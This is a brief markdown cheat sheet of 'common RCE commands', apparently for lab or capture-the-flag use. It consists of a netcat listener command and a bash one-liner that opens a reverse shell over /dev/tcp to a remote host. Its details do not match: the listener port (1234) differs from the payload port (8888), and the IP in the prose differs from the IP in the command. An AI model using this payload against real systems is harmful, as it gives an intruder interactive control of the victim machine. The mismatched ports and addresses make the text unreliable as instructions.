# Common RCE commands

Use netcat to listen locally on port 1234

```bash
netcat -lvnp 1234
```

On the remote host, connect to our listener (10.10.14.153:8888 here) with

```bash
bash -c "bash -i >& /dev/tcp/10.10.14.18/8888 0>&1"
```

